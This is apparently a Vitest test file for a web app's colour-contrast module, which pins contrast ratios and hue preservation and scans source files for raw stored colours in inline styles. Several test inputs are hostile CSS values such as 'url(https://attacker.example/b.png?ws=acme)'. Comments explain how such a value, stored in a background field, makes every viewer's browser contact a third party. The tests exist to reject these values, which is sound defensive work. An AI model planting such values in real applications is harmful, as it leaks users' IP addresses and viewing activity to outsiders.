/// <reference types="vite/client" />
import { describe, it, expect, beforeEach } from 'vitest'
// The stylesheet as TEXT, never as a stylesheet: the assertion below is that the
// module's fallback map still agrees with the tokens, and `vitest.config.ts`
// deliberately runs with the CSS pipeline off.
import INDEX_CSS from './index.css?raw'
import {
  EDGE_WEIGHT, FILL_MIN, INK_MIN, NEUTRAL_INK, SURFACE, TOKEN_FALLBACK,
  compositeOver, contrastRatio, darkest, fillOf, inkOn, onSolid, parseColour, relativeLuminance,
  resetColourCache, ringOn, tintOf, toHex, token,
} from './colour'

/**
 * **The seal on HD-176's rendering rule.**
 *
 * What is pinned here, and why each one is pinned rather than described:
 *
 *  1. **Above the threshold the transform is the identity, byte for byte.** This
 *     is the property a future refactor breaks *silently*: a rewrite that always
 *     recomputes still satisfies every ratio assertion in this file and every
 *     screenshot review, while repainting the colours of every workspace that had
 *     already tuned theirs. Nothing but an equality on the exact input string
 *     catches it.
 *  2. **Below the threshold the output clears 4.5:1 against the surface it was
 *     given, AND keeps the hue.** The ratio alone is not the guarantee — black
 *     clears every ratio. The chromaticity assertion is what makes the result
 *     *the same colour, dimmed* rather than a different colour that happens to be
 *     readable.
 *  3. **Yellow.** `#FFFF00` is the worked example the decision was argued with: a
 *     hue that cannot be read as text on a white card and must still be painted
 *     at full strength as a dot. It is asserted by value, so the rounding rule
 *     (`#7B7B00` measures 4.49, `#7A7A00` measures 4.55) has a witness.
 *
 * **This suite runs on no automated path yet.** CI executes exactly one command,
 * `./mvnw -B verify`, and the `frontend-maven-plugin` executions are `npm ci` and
 * `npm run build` — nothing invokes `npm test` (filed as HD-242). So what is
 * written here protects a reviewer and a local run, not a merge, and a claim that
 * "the property is tested" means "the assertion exists", not "the assertion ran".
 */

beforeEach(() => {
  // jsdom attaches no stylesheet, so `token()` resolves through TOKEN_FALLBACK;
  // clearing between cases keeps one test's resolution out of the next one's.
  resetColourCache()
})

// ── 1. The formula, on fixtures that prove the arithmetic and not the app ─────

describe('contrastRatio', () => {
  it('spans the full 1 → 21 range at the extremes', () => {
    expect(contrastRatio('#FFFFFF', '#000000')).toBeCloseTo(21, 2)
    expect(contrastRatio('#FFFFFF', '#FFFFFF')).toBeCloseTo(1, 2)
    expect(contrastRatio('#000000', '#000000')).toBeCloseTo(1, 2)
  })

  it('reproduces the two ratios the proposal quoted', () => {
    // The seeded Medium yellow, which is why this ticket exists…
    expect(contrastRatio('#EAB308', '#FFFFFF')).toBeCloseTo(1.92, 2)
    // …and the chart ramp's blue, which was already chosen for the card surface.
    expect(contrastRatio('#0072B2', '#FFFFFF')).toBeCloseTo(5.19, 2)
  })

  it('is symmetric, and composites alpha over the background before measuring', () => {
    expect(contrastRatio('#123456', '#FFFFFF')).toBeCloseTo(contrastRatio('#FFFFFF', '#123456'), 6)
    // 00 alpha is the background itself, so the ratio is 1:1.
    expect(contrastRatio('#00000000', '#FFFFFF')).toBeCloseTo(1, 4)
  })

  it('measures 1 rather than throwing on an input that is not a colour', () => {
    expect(contrastRatio('red', '#FFFFFF')).toBe(1)
    expect(contrastRatio(undefined, '#FFFFFF')).toBe(1)
  })
})

describe('parseColour', () => {
  it('accepts exactly the two hex forms the product stores', () => {
    expect(parseColour('#FFFFFF')).toEqual({ r: 255, g: 255, b: 255, a: 1 })
    expect(parseColour('#ffffff')).toEqual({ r: 255, g: 255, b: 255, a: 1 })
    expect(parseColour('#00000080')?.a).toBeCloseTo(128 / 255, 4)
  })

  it('rejects everything else, and cannot be made to throw', () => {
    const junk: unknown[] = ['red', '#FFF', '#12345', '', '   ', null, undefined, 42, {},
      `#${'A'.repeat(1_000_000)}`]
    for (const value of junk) expect(parseColour(value)).toBeNull()
  })
})

// ── 2. The identity property — the one a refactor breaks silently ─────────────

describe('inkOn is the identity above the threshold', () => {
  it('returns the input string byte for byte, in the case the ratio already holds', () => {
    expect(inkOn('#0072B2', '#FFFFFF')).toBe('#0072B2')
    expect(inkOn('#000000', '#FFFFFF')).toBe('#000000')
    // Case is part of "byte-identical": a workspace storing lower-case hex must
    // not see its render normalised either.
    expect(inkOn('#0072b2', '#FFFFFF')).toBe('#0072b2')
  })

  it('holds on a dark surface too — the identity is about the ratio, not the direction', () => {
    expect(contrastRatio('#FFFFFF', SURFACE.rail)).toBeGreaterThanOrEqual(INK_MIN)
    expect(inkOn('#FFFFFF', SURFACE.rail)).toBe('#FFFFFF')
  })

  it('derives only when it must: one hue either side of the boundary', () => {
    // #767676 on white measures 4.54; #777777 measures 4.48.
    expect(contrastRatio('#767676', '#FFFFFF')).toBeGreaterThanOrEqual(INK_MIN)
    expect(inkOn('#767676', '#FFFFFF')).toBe('#767676')
    expect(contrastRatio('#777777', '#FFFFFF')).toBeLessThan(INK_MIN)
    expect(inkOn('#777777', '#FFFFFF')).not.toBe('#777777')
  })
})

// ── 3. Yellow — the worked example, by value ──────────────────────────────────

/** Linear-RGB channel ratios, normalised to the largest channel. Two colours with
 *  the same triple are the same hue at different luminance. */
function chromaticity(hex: string): [number, number, number] {
  const c = parseColour(hex)!
  const lin = [c.r, c.g, c.b].map(v => {
    const s = v / 255
    return s <= 0.04045 ? s / 12.92 : Math.pow((s + 0.055) / 1.055, 2.4)
  })
  const max = Math.max(...lin) || 1
  return [lin[0] / max, lin[1] / max, lin[2] / max]
}

describe('#FFFF00 on a white card', () => {
  it('is drawn as #7A7A00 — the value the rounding rule lands on', () => {
    expect(inkOn('#FFFF00', '#FFFFFF')).toBe('#7A7A00')
    // One notch lighter is under the bar, which is why the encode step is re-measured.
    expect(contrastRatio('#7B7B00', '#FFFFFF')).toBeLessThan(INK_MIN)
    expect(contrastRatio('#7A7A00', '#FFFFFF')).toBeGreaterThanOrEqual(INK_MIN)
  })

  it('reads on the badge tint it actually sits on, and keeps its hue', () => {
    const tint = tintOf('#FFFF00', '#FFFFFF')
    const ink = inkOn('#FFFF00', tint)
    expect(contrastRatio(ink, tint)).toBeGreaterThanOrEqual(INK_MIN)

    const [dr, dg, db] = chromaticity(ink)
    const [sr, sg, sb] = chromaticity('#FFFF00')
    expect(dr).toBeCloseTo(sr, 2)
    expect(dg).toBeCloseTo(sg, 2)
    expect(db).toBeCloseTo(sb, 2)
  })

  it('keeps the dot at full strength beside that ink, with a ring that clears 3:1', () => {
    // The fill is never dimmed: the identity stays on screen.
    const ring = ringOn('#FFFF00', '#FFFFFF')
    expect(contrastRatio(ring, '#FFFFFF')).toBeGreaterThanOrEqual(FILL_MIN)
    expect(contrastRatio('#FFFF00', '#FFFFFF')).toBeLessThan(FILL_MIN) // …which is why it needs one
  })
})

// ── 4. The property, over the cube × the surfaces ─────────────────────────────

const SAMPLE = [0, 17, 34, 51, 68, 85, 102, 119, 136, 153, 170, 187, 204, 221, 238, 255]
const SURFACES = ['#FFFFFF', '#EEF1F6', '#101828']

function* cube(): Generator<string> {
  for (const r of SAMPLE) for (const g of SAMPLE) for (const b of SAMPLE) yield toHex({ r, g, b })
}

describe('the guarantee holds for every colour an admin can pick', () => {
  it('inkOn clears 4.5:1 on a white card, a raised row and the dark rail', () => {
    const failures: string[] = []
    for (const surface of SURFACES) {
      for (const colour of cube()) {
        const ink = inkOn(colour, surface)
        const ratio = contrastRatio(ink, surface)
        if (ratio < INK_MIN - 1e-9) failures.push(`${colour} on ${surface} → ${ink} (${ratio.toFixed(3)})`)
      }
    }
    expect(failures.slice(0, 10)).toEqual([])
  })

  it('ringOn clears 3:1 on the same three surfaces', () => {
    const failures: string[] = []
    for (const surface of SURFACES) {
      for (const colour of cube()) {
        const ring = ringOn(colour, surface)
        const ratio = contrastRatio(ring, surface)
        if (ratio < FILL_MIN - 1e-9) failures.push(`${colour} on ${surface} → ${ring} (${ratio.toFixed(3)})`)
      }
    }
    expect(failures.slice(0, 10)).toEqual([])
  })

  it('onSolid is black or white and never measures below 4.58:1 against the fill', () => {
    const failures: string[] = []
    for (const colour of cube()) {
      const ink = onSolid(colour)
      if (ink !== '#000000' && ink !== '#FFFFFF') { failures.push(`${colour} → ${ink}`); continue }
      const ratio = contrastRatio(ink, colour)
      if (ratio < 4.58) failures.push(`${colour} → ${ink} (${ratio.toFixed(3)})`)
    }
    expect(failures.slice(0, 10)).toEqual([])
  })

  it('preserves the hue wherever it dims — chromaticity, not just the ratio', () => {
    const failures: string[] = []
    for (const colour of cube()) {
      const ink = inkOn(colour, '#FFFFFF')
      if (ink === colour) continue                       // identity, nothing to compare
      if (ink === '#000000' || ink === '#FFFFFF') continue // the documented terminal fallback
      const before = chromaticity(colour)
      const after = chromaticity(ink)
      // 8-bit quantisation moves a channel ratio a little; a hue CHANGE moves it
      // a lot. The bound is loose enough for rounding and tight enough that a
      // second hue could not hide under it.
      const drift = Math.max(...before.map((v, i) => Math.abs(v - after[i])))
      if (drift > 0.06) failures.push(`${colour} → ${ink} (drift ${drift.toFixed(3)})`)
    }
    expect(failures.slice(0, 10)).toEqual([])
  })
})

describe('fillOf', () => {
  it('is the identity for every hue a picker can produce — a fill is never dimmed', () => {
    const failures: string[] = []
    for (const colour of cube()) if (fillOf(colour) !== colour) failures.push(colour)
    expect(failures.slice(0, 10)).toEqual([])
    // Case and alpha survive too: the stored value is what gets painted.
    expect(fillOf('#0072b2')).toBe('#0072b2')
    expect(fillOf('#0072B280')).toBe('#0072B280')
  })

  it('answers a TOKEN for anything that is not a colour, and never the input', () => {
    // Each of these reaches `node.style.background` today on an instance upgraded
    // past a pre-HD-176 build: `config.options[].color` is JSONB, it has no column
    // width, and V27's 422 closes the write door without touching stored rows.
    const hostile: unknown[] = [
      'url(https://attacker.example/b.png?ws=acme)',
      'red',
      'image-set("https://attacker.example/b.png" 1x)',
      '#FFF',
      '#12345',
      '',
      '   ',
      null,
      undefined,
      42,
      {},
      `#${'A'.repeat(1_000_000)}`,
    ]
    for (const value of hostile) {
      expect(fillOf(value), String(value).slice(0, 40)).toBe('var(--color-surface-2)')
    }
  })

  it('takes a caller-chosen neutral, because not every fallback is the neutral fill', () => {
    expect(fillOf('url(https://attacker.example/b.png)', 'var(--color-text-muted)'))
      .toBe('var(--color-text-muted)')
    // …and the fallback is not consulted when there IS a hue.
    expect(fillOf('#FFFF00', 'var(--color-text-muted)')).toBe('#FFFF00')
  })

  it('treats a fully transparent hue as absent, like every other function here', () => {
    // An invisible fill under a neutral ring is a worse answer than a neutral
    // fill under one, and `ringOn`/`tintOf` already take the second reading.
    expect(fillOf('#FFFF0000')).toBe('var(--color-surface-2)')
    expect(ringOn('#FFFF0000', '#FFFFFF')).toBe('var(--color-border)')
  })
})

describe('whitespace a CSS tokenizer does not agree is whitespace', () => {
  // `String.prototype.trim` strips NBSP and the BOM; the CSS tokenizer strips
  // neither. `parseColour` matched on the trimmed form, so returning the ORIGINAL
  // would round-trip a legacy value carrying one into a declaration the browser
  // then discards — a hue silently missing rather than a hue derived.
  // Written as escapes, deliberately: the two characters this case exists for
  // are invisible in a diff, and a reviewer must be able to see which they are.
  const dirty = '\u00A0#0072B2\uFEFF'

  it('parses, and comes back out in the form that was matched', () => {
    expect(parseColour(dirty)).not.toBeNull()
    expect(fillOf(dirty)).toBe('#0072B2')
    // #0072B2 clears 4.5:1 on white, so this is the IDENTITY path — the one that
    // used to hand back `raw` and hand the NBSP back with it.
    expect(inkOn(dirty, '#FFFFFF')).toBe('#0072B2')
    expect(ringOn(dirty, '#FFFFFF')).toBe('#0072B2')
  })

  it('is the same answer as the clean form, memo entry included', () => {
    expect(inkOn(dirty, '#FFFFFF')).toBe(inkOn('#0072B2', '#FFFFFF'))
  })
})

describe('the memo is keyed on a hue, never on the string a caller passed', () => {
  it('does not let an unparseable megabyte become a Map key', () => {
    // 512 entries is a bound on the COUNT; without the parse guard in front of
    // the memo, one workspace's oversized option colour is one 20 KB key, and a
    // few hundred of them are ~10 MB of live cache per tab.
    const huge = 'z'.repeat(200_000)
    expect(inkOn(huge, '#FFFFFF')).toBe(NEUTRAL_INK)
    expect(tintOf(huge, '#FFFFFF')).toBe('var(--color-surface-2)')
    expect(onSolid(huge)).toBe(NEUTRAL_INK)
    // Nothing was stored, so the hue asked for next is computed, not evicted.
    expect(inkOn('#FFFF00', '#FFFFFF')).toBe('#7A7A00')
  })
})

describe('inputs that are not colours', () => {
  it('fall back to the neutral token and throw nothing', () => {
    const junk: unknown[] = ['red', '#FFF', '#12345', '', undefined, null, 7, `#${'0'.repeat(1_000_000)}`]
    for (const value of junk) {
      expect(inkOn(value, '#FFFFFF')).toBe(NEUTRAL_INK)
      expect(onSolid(value)).toBe(NEUTRAL_INK)
      expect(ringOn(value, '#FFFFFF')).toBe('var(--color-border)')
      expect(tintOf(value, '#FFFFFF')).toBe('var(--color-surface-2)')
    }
  })

  it('treats a fully transparent colour as absent rather than as black', () => {
    expect(inkOn('#FFFF0000', '#FFFFFF')).toBe(NEUTRAL_INK)
  })

  it('composites a translucent colour over its surface before deciding', () => {
    const ink = inkOn('#FFFF0080', '#FFFFFF')
    expect(parseColour(ink)).not.toBeNull()
    expect(contrastRatio(ink, '#FFFFFF')).toBeGreaterThanOrEqual(INK_MIN)
  })
})

// ── 5. Tints, surfaces and the memo ───────────────────────────────────────────

describe('tintOf', () => {
  it('returns an opaque colour, not an overlay — so what we measured is what we paint', () => {
    const tint = tintOf('#FFFF00', '#FFFFFF')
    expect(tint).toMatch(/^#[0-9A-F]{6}$/)
    expect(tint).toBe(toHex(compositeOver({ r: 255, g: 255, b: 0, a: 0x20 / 255 }, { r: 255, g: 255, b: 255 })))
  })

  it('is heavier at the hairline weight than at the fill weight', () => {
    const fill = tintOf('#0EA5A4', '#FFFFFF')
    const edge = tintOf('#0EA5A4', '#FFFFFF', EDGE_WEIGHT)
    expect(relativeLuminance(parseColour(edge)!)).toBeLessThan(relativeLuminance(parseColour(fill)!))
  })

  it('composites against the surface it is given, not against an assumed white', () => {
    expect(tintOf('#FFFFFF', '#101828')).not.toBe(tintOf('#FFFFFF', '#FFFFFF'))
  })
})

describe('surfaces', () => {
  it('resolve from the design tokens, and the fallback still agrees with index.css', () => {
    expect(INDEX_CSS, 'index.css did not resolve — this assertion is running on an empty string')
      .toBeTruthy()
    const css = INDEX_CSS

    const names = Object.keys(TOKEN_FALLBACK)
    expect(names.length).toBeGreaterThan(4) // tripwire: an emptied map passes everything below

    for (const name of names) {
      const declared = new RegExp(`${name}:\\s*(#[0-9A-Fa-f]{6})\\s*;`).exec(css)
      expect(declared, `${name} is not declared in index.css`).not.toBeNull()
      expect(TOKEN_FALLBACK[name].toUpperCase()).toBe(declared![1].toUpperCase())
      expect(token(name).toUpperCase()).toBe(declared![1].toUpperCase())
    }
  })

  it('prefers the LIVE custom property, so a re-skin needs no edit here', () => {
    // The whole point of the token strategy is that `index.css` remaps values
    // behind stable names. If `token()` ever answered from its own map while a
    // stylesheet said otherwise, every derivation would be measured against a
    // surface the user is not looking at.
    const style = document.createElement('style')
    style.textContent = ':root { --color-card: #101828; }'
    document.head.appendChild(style)
    try {
      resetColourCache()
      expect(token('--color-card')).toBe('#101828')
      expect(SURFACE.card).toBe('#101828')
    } finally {
      style.remove()
      resetColourCache()
    }
    expect(SURFACE.card).toBe('#FFFFFF')
  })

  it('picks the darkest state a hoverable row can take, so the ratio holds in both', () => {
    expect(darkest('#FFFFFF', '#F3F5F9', '#EEF1F6')).toBe('#EEF1F6')
    expect(SURFACE.row).toBe(SURFACE.raised)
    expect(darkest('nonsense', '#FFFFFF')).toBe('#FFFFFF')
  })
})

describe('the memo', () => {
  it('stays bounded, and answers the same after it overflows as before', () => {
    const before = inkOn('#EAB308', '#FFFFFF')
    for (let i = 0; i < 700; i++) inkOn(toHex({ r: i % 256, g: (i * 7) % 256, b: (i * 13) % 256 }), '#FFFFFF')
    expect(inkOn('#EAB308', '#FFFFFF')).toBe(before)
  })
})

// ── 6. The category test — one primitive, no local variants ───────────────────

const SOURCES = import.meta.glob('./**/*.{ts,tsx}', {
  query: '?raw',
  import: 'default',
  eager: true,
}) as Record<string, string>

const isTestFile = (id: string) => /\.(test|spec)\.tsx?$/.test(id)

/**
 * A CSS `color` assigned straight from a `*.color` data field, on a line that is
 * writing an inline style.
 *
 * What this can and cannot see, stated so a green run is not read as more than it
 * is: it catches the shape the codebase actually writes — one line, `style={{ …
 * color: x.color … }}`. It does **not** see a style object built in a variable, a
 * colour passed through a helper, or a `color` set from a field named anything
 * other than `color`. It is a tripwire against the next component reintroducing
 * the old pattern by copy-paste, which is how `Badge` and `LabelChip` came to
 * disagree in the first place, and never a proof that every glyph is derived.
 *
 * **A stored hue copied into a bare local is out of reach of this line, and is
 * staying that way.** The issue-detail parent breadcrumb held its parent issue
 * type's hue in a `parentColor` local and painted a `#EAB308` key at 1.92:1
 * through every run this file was green — the same blind spot `RAW_FILL` records
 * one indirection later for the aging chart's `columnColor(column)`. Widening to
 * bare identifiers is the trade already tried and reverted there: it fires on
 * every `seriesColor(…)` and every `const color = CHART_SERIES[0]`, which are
 * `var(--color-chart-N)` **tokens**, and the only edit that turns it green erases
 * the series. So that site was fixed by **removing the shape** rather than by
 * scanning for it — the hue now reaches `inkOn` straight from the entity, bound
 * to no name at all — and the guarantee is pinned where it can be measured
 * instead of read: `IssueDetail.test.tsx` asserts from the DOM that a parent
 * whose issue type's hue fails {@link INK_MIN} renders derived ink, phrased about
 * the entity so renaming or re-inlining the local cannot decide whether the
 * guarantee is checked. A named blind spot with a behavioural pin behind it is
 * worth more than a tripwire whose green demands a wrong edit.
 *
 * The trailing lookahead excuses a *ternary condition* — `color: opt?.color ?
 * inkOn(…) : …` reads the field to decide, and paints through the primitive. A
 * `??` default is deliberately still an offence: that one paints the raw hue.
 */
const RAW_INK = /\bcolor:\s*[A-Za-z_$][\w$]*\??(?:\.[\w$]+\??)*\.color\b(?!\s*\?(?!\?))/

/**
 * **The counterpart this file spent five slices without, and the reason the hole
 * existed (HD-176).**
 *
 * A fill is painted at full strength, so `fillOf` is arithmetically the identity
 * for every colour a picker can produce — which made it look like the one clause
 * of the rule that needed no function, and therefore the one whose call sites
 * needed no import. A site with no import is a site nobody reviewing `colour.ts`
 * ever reads. `RAW_INK` sealed the derived half and left the underived half open
 * by construction: every `background: <stored>` in the app went straight from
 * JSONB to `node.style`.
 *
 * That is a *security* asymmetry and not only a contrast one. `color` and
 * `borderColor` take colours, so a hostile value there is simply dropped;
 * `background` is a shorthand that also takes `background-image`, so CSSOM
 * accepts `url(https://attacker.example/b.png?ws=acme)` and every project member's
 * browser fetches it — viewer IP, user agent and view timing to a third party, no
 * script and no CSP in the stack to stop it. Statuses, priorities, types and
 * labels are bounded by `@Pattern` plus a narrow column; `config.options[].color`
 * is JSONB, and V27's 422 closes the write door **without cleaning rows already
 * stored**, so an upgraded instance still serves one to every board load.
 *
 * **What it matches:** a `background` / `backgroundColor` whose value *begins*
 * with a member chain whose last segment ends in `color` — `opt.color`,
 * `status.color || …`, `i.type.color`, `cmd.dotColor`. The last of those is why
 * this is not simply `RAW_INK` with a different property name: `RAW_INK` requires
 * the field to be spelled exactly `.color`, and the palette's dot had been
 * carrying an issue type's hue under the name `dotColor` since the command
 * palette shipped, in a file `RAW_INK` scanned every run.
 *
 * **What it cannot see,** stated so a green run is not read as more than it is:
 * anything that is not a member chain. A bare local (`background: tint`,
 * `background: c`), a helper's return (`background: columnColor(column)` — the
 * aging chart's status dot, which this ticket found by hand and this line would
 * not have), a style object assembled in a variable, a hue reaching CSS through a
 * template string. Widening it to bare identifiers was tried and reverted: it
 * fires on every `seriesColor(…)` and every `const color = CHART_SERIES[0]`,
 * which are `var(--color-chart-N)` **tokens** — and the fix that silences a false
 * positive here is `fillOf` around a `var(...)`, which returns the neutral and
 * erases the series. A tripwire whose green demands a wrong edit gets the wrong
 * edit.
 *
 * The trailing lookahead excuses a *ternary condition* for the same reason
 * `RAW_INK` does — `background: x.color ? fillOf(x.color) : NEUTRAL_FILL` reads
 * the field to decide and paints through the primitive. `??` and `||` stay
 * offences: those paint the raw value.
 */
const RAW_FILL = /\bbackground(?:Color)?:\s*[A-Za-z_$][\w$]*\??(?:\.[\w$]+\??)*\.[\w$]*[Cc]olor\b(?!\s*\?(?!\?))/

const PRIMITIVE_HINT = [
  'HD-176: a colour that comes from the database is an IDENTITY HUE, not ink.',
  '',
  'Paint it at full strength wherever it is a fill (dot, tile, tint, bar, chart',
  'segment) and derive the glyph from it:',
  '',
  "  import { SURFACE, fillOf, inkOn, ringOn, onSolid, tintOf } from '…/colour'",
  '',
  '  style={{ color: inkOn(type.color, SURFACE.row) }}          // a glyph',
  '  style={{ background: fillOf(type.color),                   // a fill…',
  '           boxShadow: `inset 0 0 0 1px ${ringOn(type.color, SURFACE.card)}` }}  // …and its ring',
  '  style={{ background: fillOf(type.color), color: onSolid(type.color) }}  // text ON the fill',
  '',
  'Pass the surface the glyph actually lands on — a card, a hoverable row',
  '(SURFACE.row) or the dark rail — because the same hue needs a different',
  'factor on each. Above 4.5:1 the derivation returns the stored hex untouched,',
  'so a workspace that already tuned its colours sees no change at all.',
  '',
  '`fillOf` changes NO pixel for any colour a picker can produce — it is the',
  'identity for every hex and a token for everything else. That is exactly why it',
  'is easy to skip, and why skipping it is the one of these four that is not a',
  'contrast bug: `background` is a shorthand that also takes background-image, so',
  'a stored `url(https://…)` reaches CSSOM intact and every viewer of the board',
  'fetches it. Pass a second argument when the fallback is not the neutral fill',
  "(a chart's context grey, a category's own token).",
].join('\n')

describe('one primitive, no local variants', () => {
  it('scans a corpus rather than nothing', () => {
    const scanned = Object.keys(SOURCES).filter(id => !isTestFile(id))
    expect(scanned.length, 'the {ts,tsx} glob resolved almost nothing, so the scans below pass vacuously')
      .toBeGreaterThan(60)
  })

  it('no component paints a stored colour straight into a CSS color', () => {
    const offenders: string[] = []
    for (const [id, source] of Object.entries(SOURCES)) {
      if (isTestFile(id)) continue
      source.split(/\r?\n/).forEach((line, i) => {
        if (!/style\s*[={]/.test(line)) return
        if (RAW_INK.test(line)) offenders.push(`${id}:${i + 1}: ${line.trim()}`)
      })
    }
    expect(offenders, `\n${PRIMITIVE_HINT}\n\nRaw ink at:\n${offenders.join('\n')}\n`).toEqual([])
  })

  it('no component paints a stored colour straight into a CSS background', () => {
    // Deliberately NO `style` prefilter, unlike the ink scan above. Almost every
    // fill in this codebase sits inside a multi-line style object, so the word
    // `style` is three lines above the offence and a per-line prefilter would
    // have excused thirteen of the fifteen sites this ticket fixed.
    const offenders: string[] = []
    for (const [id, source] of Object.entries(SOURCES)) {
      if (isTestFile(id)) continue
      source.split(/\r?\n/).forEach((line, i) => {
        if (RAW_FILL.test(line)) offenders.push(`${id}:${i + 1}: ${line.trim()}`)
      })
    }
    expect(offenders, `\n${PRIMITIVE_HINT}\n\nRaw fill at:\n${offenders.join('\n')}\n`).toEqual([])
  })

  it('leaves the two densest surfaces without a box — no padding, no radius, no fill', () => {
    // The variant this decision rejected (solid chip) would have turned the issue
    // type on a board card and a backlog row into a second bounding box, at the
    // width where the backlog already truncates the name at 90px. Density was the
    // most expensive thing the change could have cost, so it is asserted rather
    // than promised.
    for (const id of ['./pages/BoardPage.tsx', './pages/BacklogPage.tsx']) {
      const lines = (SOURCES[id] ?? '').split(/\r?\n/)
      const site = lines.find(l => l.includes('inkOn(issue.type.color'))
      expect(site, `${id} no longer renders the issue type through inkOn`).toBeTruthy()
      expect(site).not.toMatch(/background|padding|borderRadius|border:/)
    }
  })
})
